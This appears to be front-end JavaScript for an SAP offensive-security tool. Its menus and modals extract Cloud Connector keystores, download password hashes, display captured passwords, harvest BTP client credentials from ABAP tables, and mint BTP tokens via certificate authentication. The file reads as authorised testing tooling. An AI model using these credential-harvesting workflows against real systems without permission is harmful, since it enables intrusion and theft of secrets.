    suggestions.push({icon: '📡', label: 'Probe Mappings', action: 'scc_probe_mappings'});

  return suggestions.slice(0, 3);
}

function showSCCCtxMenu(e, host) {
  e.preventDefault();
  e.stopPropagation();
  hideCtxMenu();
  hideMapCtxMenu();
  hideBTPCtxMenu();
  hideTMSCtxMenu();
  hideDBCONCtxMenu();
  selectedSccHost = host;
  const menu = document.getElementById('scc-ctx-menu');

  // Show stored credentials below the "Set Credentials" item — same
  // pattern as ABAP nodes showing credentials in their context menu.
  let oldInfo = menu.querySelector('.ctx-cred-info');
  if (oldInfo) oldInfo.remove();
  const sn = (mapState.scc_nodes || {})[host];
  const creds = (sn && sn.credentials) ? sn.credentials : [];
  if (creds.length > 0) {
    const info = document.createElement('div');
    info.className = 'ctx-cred-info';
    info.style.cssText = 'padding:4px 12px;font-size:10px;color:#8b949e;border-top:1px solid #30363d;pointer-events:none';
    const lines = creds.map(c => {
      const u = c.username || c.user || '?';
      const p = c.password || '';
      return `\u2705 ${escHtml(u)}${p ? ' / ' + escHtml(p) : ''}`;
    });
    info.innerHTML = lines.join('<br>');
    const credItem = menu.querySelector('[data-action="scc_set_credentials"]');
    if (credItem && credItem.nextSibling) {
      credItem.parentNode.insertBefore(info, credItem.nextSibling);
    } else {
      menu.appendChild(info);
    }
  }

  // Suggested next actions (Phase 5 workflow guidance)
  let oldSugg = menu.querySelector('.ctx-suggested');
  if (oldSugg) oldSugg.remove();
  const suggestions = getSCCSuggestedActions(sn, host);
  if (suggestions.length > 0) {
    const suggDiv = document.createElement('div');
    suggDiv.className = 'ctx-suggested';
    suggDiv.innerHTML = '<div class="ctx-suggested-hdr">Suggested Next</div>'
      + suggestions.map(s =>
        `<div class="ctx-suggest-item" data-action="${s.action}">${s.icon} ${s.label}</div>`
      ).join('');
    menu.insertBefore(suggDiv, menu.firstChild);
  }
  // Highlight matching items in submenus
  menu.querySelectorAll('.ctx-item.ctx-highlighted').forEach(el => el.classList.remove('ctx-highlighted'));
  const suggActions = new Set(suggestions.map(s => s.action));
  menu.querySelectorAll('.ctx-item[data-action]').forEach(item => {
    if (suggActions.has(item.getAttribute('data-action'))) item.classList.add('ctx-highlighted');
  });

  menu.classList.add('visible');
  // Position with viewport clamp
  const w = menu.offsetWidth || 280;
  const h = menu.offsetHeight || 200;
  const x = Math.min(e.clientX, window.innerWidth - w - 8);
  const y = Math.min(e.clientY, window.innerHeight - h - 8);
  menu.style.left = x + 'px';
  menu.style.top = y + 'px';
  _reflowSubmenus(menu, x, w);
}

function hideSCCCtxMenu() {
  document.getElementById('scc-ctx-menu').classList.remove('visible');
}

document.getElementById('scc-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action], .ctx-suggest-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  const action = item.getAttribute('data-action');
  hideSCCCtxMenu();
  const host = selectedSccHost;
  if (!host) return;
  switch (action) {
    case 'scc_details':          showSCCDetail(host); break;
    case 'scc_set_credentials':  showSCCCredModal(host); break;
    case 'scc_probe_creds':      sccProbeCreds(host); break;
    case 'scc_pull_mappings':    sccPullMappings(host); break;
    case 'scc_probe_mappings':   sccProbeMappings(host); break;
    case 'scc_extract_keystore':  sccExtractKeystore(host); break;
    case 'scc_download_hashes':  sccDownloadHashes(host); break;
    case 'scc_analyse_pp':        sccAnalysePP(host); break;
    case 'scc_delete':            sccRemoveFromMap(host); break;
  }
});

async function sccRemoveFromMap(host) {
  if (!confirm('Remove SCC ' + host + ' from the map? (Local-only; will reappear on next scan if still present.)')) return;
  // Server-side removal so the next /api/state poll doesn't restore
  // the node (issue #2 follow-up).  Local delete first for snappy UI.
  // NB: previous code called renderMap() which doesn't exist — that
  // ReferenceError silently aborted the handler before any DELETE
  // fired.  Correct redraw entry point is updateMap().
  if (mapState.scc_nodes) delete mapState.scc_nodes[host];
  updateMap();
  try {
    const r = await api('DELETE', `scc/${encodeURIComponent(host)}`);
    if (r && r.error) showToast('SCC delete failed: ' + r.error, 'error');
  } catch (e) { showToast('SCC delete error: ' + e, 'error'); }
}

async function sccAnalysePP(host) {
  // The analyser is also auto-run after Extract Keystore — this menu
  // item is the manual re-run for when the operator has edited the
  // backup or wants a fresh pass without re-pulling.
  const sn = (mapState.scc_nodes || {})[host] || {};
  if (!sn.keystore_extracted) {
    alert('Run Extract Keystore first — the PP analyser reads '
          + '<principalPropagationConfiguration> + trustcfg_*.xml '
          + 'from the backup zip on disk.');
    return;
  }
  flashActivity('SCC ' + host + ': re-analysing PP trust', 5000);
  try {
    const r = await fetch('/api/scc/' + encodeURIComponent(host) + '/analyse_pp',
                          { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' });
    const d = await r.json();
    if (d.error) alert('PP analyse failed: ' + d.error);
    else showToast('PP analyser re-run — see findings drawer', 'info');
  } catch (e) { alert('PP analyse error: ' + e); }
}

// --- BTP subaccount context menu --------------------------------------
let selectedBtpUuid = null;

function showBTPCtxMenu(e, uuid) {
  e.preventDefault();
  e.stopPropagation();
  hideCtxMenu();
  hideSCCCtxMenu();
  hideMapCtxMenu();
  hideTMSCtxMenu();
  hideDBCONCtxMenu();
  selectedBtpUuid = uuid;
  const menu = document.getElementById('btp-ctx-menu');
  // Disable copy items when the underlying field is empty so the
  // operator gets visual feedback rather than a silent no-op.
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const setEnabled = (action, enabled) => {
    const el = menu.querySelector(`[data-action="${action}"]`);
    if (!el) return;
    if (enabled) el.classList.remove('disabled');
    else         el.classList.add('disabled');
  };
  setEnabled('btp_copy_subdomain', !!bn.subdomain);
  setEnabled('btp_copy_region',    !!bn.region);
  const linkedCount = (bn.destinations || [])
    .filter(d => d && d.linked_target_sid).length;
  setEnabled('btp_highlight_links', linkedCount > 0);
  menu.classList.add('visible');
  const w = menu.offsetWidth || 280;
  const h = menu.offsetHeight || 200;
  const x = Math.min(e.clientX, window.innerWidth  - w - 8);
  const y = Math.min(e.clientY, window.innerHeight - h - 8);
  menu.style.left = x + 'px';
  menu.style.top  = y + 'px';
  _reflowSubmenus(menu, x, w);
}

function hideBTPCtxMenu() {
  document.getElementById('btp-ctx-menu').classList.remove('visible');
}

document.getElementById('btp-ctx-menu').addEventListener('click', function(e) {
  const item = e.target.closest('.ctx-item[data-action]');
  if (!item || item.classList.contains('disabled')) return;
  const action = item.getAttribute('data-action');
  hideBTPCtxMenu();
  const uuid = selectedBtpUuid;
  if (!uuid) return;
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  switch (action) {
    case 'btp_details':
      showBTPDetail(uuid);
      break;
    case 'btp_mint_via_cert':
      showBtpMintViaCertModal(uuid);
      break;
    case 'btp_mint_via_local_cert':
      showBtpMintViaLocalCertModal(uuid);
      break;
    case 'btp_pull_destinations':
      btpRefreshDestinations(uuid);
      break;
    case 'btp_highlight_links':
      btpHighlightLinkedTargets(uuid);
      break;
    case 'btp_copy_uuid':
      _copyToClipboard(uuid, 'UUID');
      break;
    case 'btp_copy_subdomain':
      _copyToClipboard(bn.subdomain || '', 'subdomain');
      break;
    case 'btp_copy_region':
      _copyToClipboard(bn.region || '', 'region');
      break;
    case 'btp_remove':
      btpRemoveFromMap(uuid);
      break;
  }
});

async function btpRefreshDestinations(uuid) {
  flashActivity('BTP ' + uuid.slice(0, 8) + ': re-pulling destinations', 8000);
  try {
    const r = await fetch('/api/btp/pull_destinations/' + encodeURIComponent(uuid),
                          { method: 'POST', headers: {'Content-Type':'application/json'}, body: '{}' });
    const d = await r.json();
    if (d.error) {
      alert('Refresh failed: ' + d.error);
    } else {
      showToast('BTP destinations refreshed', 'info');
    }
  } catch (e) {
    alert('Refresh error: ' + e);
  }
}

// RFC 8705 cert-auth token mint UX.
//
// Prereqs the operator has to have set up before this runs:
//   * BTP-side: an x509 service key (X509_PROVIDED or _GENERATED)
//     on a destination-service instance, granting whatever scopes
//     the token should carry
//   * On-prem: an SM59 Type-G destination with SSL Client PSE set
//     to the cert BTP has on file, URL pointing at the
//     <sub>.authentication.cert.<region>.hana.ondemand.com/oauth/token
//     endpoint, Q=A (SSL Client Certificate).  See the README for
//     the full setup walk-through.
//
// The modal lists every eligible X509 Type-G destination in the
// session (any on-prem system may source one; multiple destinations
// per subaccount is legal) and asks for the BTP-issued client_id.
// The mint helper's response is echoed inline so the operator sees
// the enumerate delta without a second click.
function _btpEligibleCertDestinations(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const target = (bn.subdomain || '').toLowerCase();
  const hostSuffix = '.hana.ondemand.com';
  const out = [];
  (mapState.connections || []).forEach(c => {
    if (!c) return;
    if ((c.conn_type || '') !== 'http') return;
    if ((c.http_auth_type || '').toUpperCase() !== 'X509') return;
    const url = c.http_url || '';
    if (!url) return;
    let host = '';
    try { host = new URL(url).hostname.toLowerCase(); } catch (_) { return; }
    if (!host.endsWith(hostSuffix)) return;
    // Loose match on subdomain — the subaccount tenant's XSUAA
    // host starts with the subdomain (or its cert. sibling).
    if (target && !host.startsWith(target + '.') && !host.startsWith(target + '-')) {
      // No positive subdomain match — but the destination still
      // lands in the same tenant if the subaccount was
      // auto-materialised keyed by hostname.  Include as a weak
      // candidate; the operator picks.
    }
    out.push({
      source_sid: c.source_sid,
      dest_name: c.destination_name,
      host: host,
      pse: c.http_cert_pse || '',
      is_cert_host: host.indexOf('.authentication.cert.') !== -1,
    });
  });
  return out;
}

function showBtpMintViaCertModal(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const dests = _btpEligibleCertDestinations(uuid);
  const cachedIds = mapState.btp_mint_client_ids || {};
  // Kill any previous instance FIRST — reopening the modal without
  // this leaves two overlays stacked and doBtpMintViaCert's lookup
  // grabs whichever one document.querySelector finds first.
  const existing = document.getElementById('btpc-modal-overlay');
  if (existing) existing.remove();
  const overlay = document.createElement('div');
  // Unique id — plain `.modal-overlay` class collides with the
  // pre-existing (permanently-in-DOM) credentials / SCC / etc.
  // modals, and querySelector('.modal-overlay') would return one
  // of those instead of ours.  Bug pin (2026-07-10): dests read
  // as [] → "No destination selected" despite dropdown being
  // clearly populated in the screenshot.
  overlay.id = 'btpc-modal-overlay';
  overlay.className = 'modal-overlay';
  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };

  const destOptions = dests.map((d, i) => {
    const warn = d.is_cert_host ? ''
      : ' <span style="color:#e3b341;font-size:10px">(non-.cert. host — will 401)</span>';
    return `<option value="${i}" ${i === 0 ? 'selected' : ''}>` +
      `${escHtml(d.source_sid)} · ${escHtml(d.dest_name)} → ` +
      `${escHtml(d.host)} (PSE ${escHtml(d.pse || '?')})</option>`;
  }).join('');

  const noDestBlock = `
    <div style="padding:14px;background:#0d1117;border:1px dashed #30363d;border-radius:6px;text-align:center;color:#8b949e;font-size:12px;line-height:1.5">
      No eligible X509 destinations found for this subaccount.<br>
      Create an SM59 Type-G destination on the on-prem system with:<br>
      &nbsp;&nbsp;• Host: <code>&lt;subdomain&gt;.authentication.cert.&lt;region&gt;.hana.ondemand.com</code><br>
      &nbsp;&nbsp;• Port: <code>443</code>, Path Prefix: <code>/oauth/token</code><br>
      &nbsp;&nbsp;• Logon &amp; Security: <b>SSL Active</b>, PSE holding the cert BTP has on file, Q=A<br>
      then run <b>Retrieve RFC Connections</b> and re-open this modal.
    </div>`;

  overlay.innerHTML = `
    <div class="modal" style="max-width:820px;width:96%;max-height:90vh;overflow-y:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;color:#c9d1d9">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <h3 style="margin:0;color:#f0883e">&#128273; Mint BTP Token via Cert-Auth (RFC 8705)</h3>
        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;border:0;color:#c9d1d9;font-size:22px;cursor:pointer">&times;</button>
      </div>
      <div style="font-size:12px;color:#8b949e;margin-bottom:12px;line-height:1.5">
        Target subaccount <code>${escHtml(bn.subdomain || uuid.slice(0, 8))}</code> (region <code>${escHtml(bn.region || '?')}</code>).
        The SAP kernel presents the PSE's client cert on the mTLS handshake to XSUAA's
        <code>/oauth/token</code> endpoint; BTP validates the RFC-8705 x5t#S256 binding and issues a
        destination-service-scoped access token — <b>no client_secret required</b>.
      </div>

      ${dests.length === 0 ? noDestBlock : `
        <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
          <label style="font-size:11px;color:#8b949e">Destination (source · SM59 name → BTP host)</label>
          <select id="btpc-dest" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">${destOptions}</select>
        </div>

        <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
          <label style="font-size:11px;color:#8b949e;display:flex;align-items:center;gap:6px">
            <span>BTP client_id</span>
            <span title="From cf service-key &lt;name&gt; &lt;keyname&gt; | jq .credentials.uaa.clientid — typical shape sb-&lt;uuid&gt;!b&lt;N&gt;|destination-xsappname!b&lt;M&gt;" style="color:#58a6ff;cursor:help">&#9432;</span>
            <button type="button" id="btpc-autodetect-btn" onclick="autoDetectBtpClientId('${escHtml(uuid)}')" style="margin-left:auto;background:#238636;color:#fff;border:0;padding:2px 10px;border-radius:3px;cursor:pointer;font-size:10px">
              &#128269; Auto-detect from ABAP captures
            </button>
          </label>
          <input id="btpc-cid" placeholder="sb-&lt;serviceinstanceid&gt;!b&lt;subaccount&gt;|destination-xsappname!b&lt;xsappname-id&gt;" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
          <select id="btpc-cid-choices" style="display:none;padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px" onchange="document.getElementById('btpc-cid').value = this.value"></select>
          <details style="margin-top:4px">
            <summary style="cursor:pointer;font-size:10px;color:#58a6ff">Where do I find the client_id?</summary>
            <div style="font-size:11px;color:#8b949e;padding:6px 8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;margin-top:4px;line-height:1.5">
              The client_id is a <b>BTP-side identifier</b> minted by XSUAA when the x509 service key was bound. It has no relation to the on-prem SAP system. Three ways to retrieve it:
              <br><br>
              <b>1. cf CLI</b> — if you ran <code>cf create-service-key</code> already, its output has it:
              <br><code style="color:#7ee787">cf service-key &lt;instance&gt; &lt;keyname&gt; | jq -r .credentials.uaa.clientid</code>
              <br><br>
              <b>2. BTP cockpit</b> — Subaccount → Services → Instances and Subscriptions → your <code>destination</code> (or x509 xsappname) service → Service Keys tab → click the key → the <code>clientid</code> field is visible in the credentials block.
              <br><br>
              <b>3. Service Manager API</b> — if you have a CF token with <code>service_manager.read</code>:
              <br><code style="color:#7ee787">TOKEN=$(cf oauth-token | awk '{print $2}')<br>curl -H "Authorization: bearer $TOKEN" \\<br>&nbsp;&nbsp;https://service-manager.cfapps.&lt;region&gt;.hana.ondemand.com/v1/service_bindings \\<br>&nbsp;&nbsp;| jq '.items[] | select(.credentials["credential-type"] | contains("X509")) | .credentials.uaa.clientid'</code>
              <br><br>
              The <b>Auto-detect</b> button above only finds client_ids that leaked into on-prem OA2C_CONFIG / RSECTAB / SecStoreFS — mostly useful for basic-auth destinations. For cert-auth bindings the client_id never leaves BTP by default; use one of the three methods above.
            </div>
          </details>
        </div>

        <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:14px">
          <label style="font-size:11px;color:#8b949e">
            Requested scope (optional)
            <span title="Blank = default scopes on the client binding. Set to (e.g.) destination_configuration.ApiAccess to explicitly demand that scope." style="color:#58a6ff;cursor:help">&#9432;</span>
          </label>
          <input id="btpc-scope" placeholder="(blank = default; e.g. destination_configuration.ApiAccess)" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
        </div>

        <div style="display:flex;justify-content:flex-end;gap:8px">
          <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;color:#c9d1d9;border:1px solid #30363d;padding:6px 14px;border-radius:4px;cursor:pointer">Cancel</button>
          <button id="btpc-mint-btn" onclick="doBtpMintViaCert('${escHtml(uuid)}')" style="background:#1f6feb;color:#fff;border:0;padding:6px 14px;border-radius:4px;cursor:pointer">Mint Token</button>
        </div>

        <div id="btpc-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:#8b949e;white-space:pre-wrap"></div>
      `}
    </div>
  `;
  document.body.appendChild(overlay);

  // Pre-fill client_id from the in-memory cache if we've minted for
  // this (subaccount, destination) before.  Backend serialises the
  // cache with "<uuid>|<dest_name>" keys (Python tuples can't
  // JSON-serialise), so we build the string key here.
  if (dests.length > 0) {
    const cacheHit = cachedIds[uuid + '|' + dests[0].dest_name];
    if (cacheHit) document.getElementById('btpc-cid').value = cacheHit;
  }

  // React to destination-picker changes: swap in whichever cached
  // client_id matches the newly-picked destination.  Convenience for
  // operators with multiple X509 destinations to the same tenant.
  const destPicker = document.getElementById('btpc-dest');
  if (destPicker) {
    destPicker.addEventListener('change', () => {
      const j = parseInt(destPicker.value, 10);
      const key = uuid + '|' + (dests[j] || {}).dest_name;
      const hit = cachedIds[key];
      if (hit) document.getElementById('btpc-cid').value = hit;
    });
  }

  // Store the destination list on the modal so the mint handler
  // can read them back without re-computing.
  overlay.dataset.dests = JSON.stringify(dests);
}

// Mint a BTP access token via cert-auth using cert+key files on
// the SAPMAP HOST (not proxied through S4H's ABAP kernel).
//
// Escape hatch for kernels whose HTTP client fails on the response
// side — kernel 7.53's chunked-response body loss is confirmed
// (2026-07-12).  Operator supplies:
//   * UAA URL (typically the .cert. hostname's /oauth/token)
//   * client_id (same one the kernel-proxied path would use)
//   * cert_path + key_path (from `cf create-service-key ...` on the
//     SAPMAP host — X509_GENERATED bindings produce both)
//
// Same RFC-8705 x5t#S256 cert-binding on the resulting token —
// same security model as the kernel-proxied flow.
function showBtpMintViaLocalCertModal(uuid) {
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const existing = document.getElementById('btpc-modal-overlay');
  if (existing) existing.remove();

  const overlay = document.createElement('div');
  overlay.id = 'btpc-modal-overlay';
  overlay.className = 'modal-overlay';
  overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:9999;display:flex;align-items:center;justify-content:center';
  overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };

  // URL guesser.  Two problems the pre-fix version had:
  //
  //   1. bn.region can carry the STRING "cert" if the subaccount
  //      was auto-materialised from a .authentication.cert.<region>.
  //      URL — the parser picked parts[2] which is "cert" for that
  //      shape.  Filter it out so we don't produce ...cert.cert...
  //      (live 2026-07-12 bug — the wrong URL returned 503 "no
  //      server for tenant" from XSUAA nginx routing).
  //
  //   2. Even with the region right, an existing X509 destination
  //      to this subaccount carries the authoritative URL.  Prefer
  //      that when present — it's what the operator has already
  //      configured and tested.
  const cert_dests = (typeof _btpEligibleCertDestinations === 'function')
    ? _btpEligibleCertDestinations(uuid) : [];
  let guessed_uaa = '';
  const cert_dest_url = cert_dests.length > 0 ? cert_dests[0].host : '';
  if (cert_dest_url) {
    // Existing destination — use its hostname, force /oauth/token path
    guessed_uaa = `https://${cert_dest_url}/oauth/token`;
  } else if (bn.subdomain && bn.region && bn.region !== 'cert') {
    guessed_uaa = `https://${bn.subdomain}.authentication.cert.${bn.region}.hana.ondemand.com/oauth/token`;
  }

  overlay.innerHTML = `
    <div class="modal" style="max-width:820px;width:96%;max-height:90vh;overflow-y:auto;background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px 20px;color:#c9d1d9">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
        <h3 style="margin:0;color:#f0883e">&#128274; Mint BTP Token via Local Cert Files</h3>
        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;border:0;color:#c9d1d9;font-size:22px;cursor:pointer">&times;</button>
      </div>
      <div style="font-size:12px;color:#8b949e;margin-bottom:12px;line-height:1.5">
        Escape hatch for kernels whose HTTP client can't read XSUAA response bodies (kernel 7.53 chunked-body bug).
        SAPMAP's Python <code>requests</code> stack POSTs directly to XSUAA using cert + key files from THIS host — no SAP kernel involved.
        Same RFC-8705 x5t#S256 cert-binding on the issued token; same subaccount <code>${escHtml(bn.subdomain || uuid.slice(0, 8))}</code>.
      </div>

      <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
        <label style="font-size:11px;color:#8b949e">UAA URL (token endpoint)</label>
        <input id="btplc-uaa" value="${escHtml(guessed_uaa)}" placeholder="https://&lt;sub&gt;.authentication.cert.&lt;region&gt;.hana.ondemand.com/oauth/token" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
      </div>

      <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
        <label style="font-size:11px;color:#8b949e">BTP client_id</label>
        <input id="btplc-cid" placeholder="sb-&lt;serviceinstanceid&gt;!b&lt;subaccount&gt;|destination-xsappname!b&lt;xsappname-id&gt;" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
        <details style="margin-top:4px">
          <summary style="cursor:pointer;font-size:10px;color:#58a6ff">Where do I find the client_id?</summary>
          <div style="font-size:11px;color:#8b949e;padding:6px 8px;background:#0d1117;border:1px solid #30363d;border-radius:4px;margin-top:4px;line-height:1.5">
            The client_id is a <b>BTP-side identifier</b> minted by XSUAA when the x509 service key was bound. It has no relation to any on-prem SAP system. Three ways to retrieve it:
            <br><br>
            <b>1. cf CLI</b> — same <code>cf service-key</code> output that gave you the cert + key files:
            <br><code style="color:#7ee787">cf service-key &lt;instance&gt; &lt;keyname&gt; | jq -r .credentials.uaa.clientid</code>
            <br><br>
            <b>2. BTP cockpit</b> — Subaccount → Services → Instances and Subscriptions → your <code>destination</code> (or x509 xsappname) service → Service Keys tab → click the key → the <code>clientid</code> field is visible in the credentials block.
            <br><br>
            <b>3. Service Manager API</b> — if you have a CF token with <code>service_manager.read</code>:
            <br><code style="color:#7ee787">TOKEN=$(cf oauth-token | awk '{print $2}')<br>curl -H "Authorization: bearer $TOKEN" \\<br>&nbsp;&nbsp;https://service-manager.cfapps.&lt;region&gt;.hana.ondemand.com/v1/service_bindings \\<br>&nbsp;&nbsp;| jq '.items[] | select(.credentials["credential-type"] | contains("X509")) | .credentials.uaa.clientid'</code>
          </div>
        </details>
      </div>

      <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
        <label style="font-size:11px;color:#8b949e">
          Client cert (PEM) — path on SAPMAP host
          <span title="From cf service-key output: credentials.certificate — saved as a .crt/.pem file. Example: /tmp/btp-client.crt" style="color:#58a6ff;cursor:help">&#9432;</span>
        </label>
        <input id="btplc-cert" placeholder="/tmp/btp-client.crt" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
      </div>

      <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:10px">
        <label style="font-size:11px;color:#8b949e">
          Private key (PEM) — path on SAPMAP host
          <span title="From cf service-key output: credentials.key — saved as a .key/.pem file. Example: /tmp/btp-client.key" style="color:#58a6ff;cursor:help">&#9432;</span>
        </label>
        <input id="btplc-key" placeholder="/tmp/btp-client.key" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
      </div>

      <div class="form-row" style="display:flex;flex-direction:column;gap:4px;margin-bottom:14px">
        <label style="font-size:11px;color:#8b949e">Requested scope (optional)</label>
        <input id="btplc-scope" placeholder="(blank = default)" style="padding:6px;background:#0d1117;color:#e6edf3;border:1px solid #30363d;border-radius:4px;font-family:monospace;font-size:11px">
      </div>

      <div style="display:flex;justify-content:flex-end;gap:8px">
        <button onclick="this.closest('.modal-overlay').remove()" style="background:transparent;color:#c9d1d9;border:1px solid #30363d;padding:6px 14px;border-radius:4px;cursor:pointer">Cancel</button>
        <button id="btplc-mint-btn" onclick="doBtpMintViaLocalCert()" style="background:#1f6feb;color:#fff;border:0;padding:6px 14px;border-radius:4px;cursor:pointer">Mint Token</button>
      </div>

      <div id="btplc-result" style="margin-top:12px;font-size:12px;font-family:monospace;color:#8b949e;white-space:pre-wrap"></div>
    </div>
  `;
  document.body.appendChild(overlay);
}

async function doBtpMintViaLocalCert() {
  const uaa = document.getElementById('btplc-uaa').value.trim();
  const cid = document.getElementById('btplc-cid').value.trim();
  const cert = document.getElementById('btplc-cert').value.trim();
  const key = document.getElementById('btplc-key').value.trim();
  const scope = document.getElementById('btplc-scope').value.trim();
  const result = document.getElementById('btplc-result');
  const btn = document.getElementById('btplc-mint-btn');
  result.style.color = '#c9d1d9';

  const missing = [];
  if (!uaa) missing.push('UAA URL');
  if (!cid) missing.push('client_id');
  if (!cert) missing.push('cert path');
  if (!key) missing.push('key path');
  if (missing.length) {
    result.style.color = '#f85149';
    result.textContent = 'Missing: ' + missing.join(', ');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Minting…';
  result.textContent = `POST ${uaa} with cert=${cert}, key=${key} …`;

  const r = await api('POST', 'btp/mint_token_via_local_cert', {
    uaa_url: uaa, client_id: cid, cert_path: cert, key_path: key, scope: scope,
  });
  btn.disabled = false;
  btn.textContent = 'Mint Token';

  if (!r || !r.ok) {
    result.style.color = '#f85149';
    result.textContent = `Mint failed: ${(r && r.error) || 'unknown error'}`;
    return;
  }

  result.style.color = '#3fb950';
  const e = r.enumerate || {};
  let line = `Token minted for region ${r.region} ✓`;
  if (r.thumbprint) line += `\n  bound to cert x5t#S256=${r.thumbprint.substring(0, 16)}…`;
  if (Array.isArray(r.scopes) && r.scopes.length) {
    line += `\n  scopes: ${r.scopes.join(', ')}`;
  }
  if (typeof e.destinations === 'number') {
    line += `\n\nauto-enumerate: ${e.destinations} destination(s), `
          + `${e.cleartext_captured} cleartext, `
          + `${e.linked_to_onprem} linked to on-prem`;
  } else if (e.error) {
    line += `\n\nauto-enumerate error: ${e.error}`;
  }
  result.textContent = line;
  startPolling();
}

// Auto-detect the BTP client_id from ABAP captures already in
// SAPMAP state (OA2C_CONFIG rows, RSECTAB entries, SM59 destinations
// to *.hana.ondemand.com, Java SecStoreFS).
//
// Reuses the existing /api/node/<sid>/harvest_btp_creds endpoint —
// same one the "Harvest BTP Credentials" modal uses.  The
// harvester returns (uaa_url, client_id, client_secret) triples;
// for cert-auth we only care about the client_id, so a candidate
// missing the secret still counts.  We filter to candidates whose
// uaa_url or origin points at THIS subaccount's tenant (subdomain
// or region match), so unrelated BTP tokens on other tenants don't
// pollute the picker.
async function autoDetectBtpClientId(uuid) {
  const overlay = document.getElementById('btpc-modal-overlay');
  if (!overlay) return;
  const dests = JSON.parse(overlay.dataset.dests || '[]');
  const idx = parseInt(document.getElementById('btpc-dest').value, 10);
  const dest = dests[idx];
  const bn = (mapState.btp_subaccounts || {})[uuid] || {};
  const btn = document.getElementById('btpc-autodetect-btn');
  const cidInput = document.getElementById('btpc-cid');
  const choicesSel = document.getElementById('btpc-cid-choices');
  const result = document.getElementById('btpc-result');

  if (!dest) {
    result.style.color = '#f85149';
    result.textContent = 'Auto-detect needs a destination selected first';
    return;
  }
  btn.disabled = true;
  btn.textContent = 'Harvesting…';
  result.style.color = '#8b949e';
  result.textContent = `Harvesting BTP credential candidates from ${dest.source_sid} …`;

  const r = await api('POST', `node/${dest.source_sid}/harvest_btp_creds`);
  btn.disabled = false;
  btn.textContent = '🔍 Auto-detect from ABAP captures';

  const cands = (r && r.candidates) || [];
  if (cands.length === 0) {
    result.style.color = '#e3b341';
    result.textContent =
      `No BTP credential candidates found on ${dest.source_sid}.\n`
      + 'The harvester scans OA2C_CONFIG + RSECTAB + Java SecStoreFS; '
      + 'cert-auth destinations that never held a client_secret leave '
      + 'no trace there.  Paste the client_id manually or run '
      + '"Retrieve RFC Connections" + "Download SecStore" first.';
    return;
  }

  // Filter to candidates that plausibly belong to THIS subaccount.
  // Subdomain is the strongest signal (it appears in the uaa_url
  // host), region is a weaker fall-back.
  const target_subdomain = (bn.subdomain || '').toLowerCase();
  const target_region = (bn.region || '').toLowerCase();
  const target_host_lc = (dest.host || '').toLowerCase();
  const match = cands.filter(c => {
    const uaa = (c.uaa_url || '').toLowerCase();
    if (target_subdomain && uaa.indexOf(target_subdomain) !== -1) return true;
    if (target_host_lc && uaa.indexOf(target_host_lc) !== -1) return true;
    if (target_region && (c.region_hint || '').toLowerCase() === target_region) return true;
    return false;
  });

  // De-dupe by client_id — the same id often appears via multiple
  // sources (SM59 + OA2C + SecStore).
  const seen = new Set();
  const unique = [];
  match.forEach(c => {
    if (c.client_id && !seen.has(c.client_id)) {
      seen.add(c.client_id);
      unique.push(c);
    }
  });

  if (unique.length === 0) {
    result.style.color = '#e3b341';
    result.textContent =
      `${cands.length} BTP credential(s) harvested on ${dest.source_sid}, but none `
      + `matched subaccount ${target_subdomain || uuid.slice(0, 8)} `
      + `(region ${target_region || '?'}).  Paste manually.`;
    return;
  }

  if (unique.length === 1) {
    cidInput.value = unique[0].client_id;
    choicesSel.style.display = 'none';
    result.style.color = '#3fb950';
    result.textContent =
      `Auto-detected ✓  client_id from `
      + `${unique[0].source} (${unique[0].label || 'no label'})`;
    return;
  }

  // Multiple hits — show a picker.  Fill the input with the first
  // choice by default; onchange on the select swaps into the input.
  choicesSel.innerHTML = unique.map((c, i) =>
    `<option value="${escHtml(c.client_id)}" ${i === 0 ? 'selected' : ''}>`
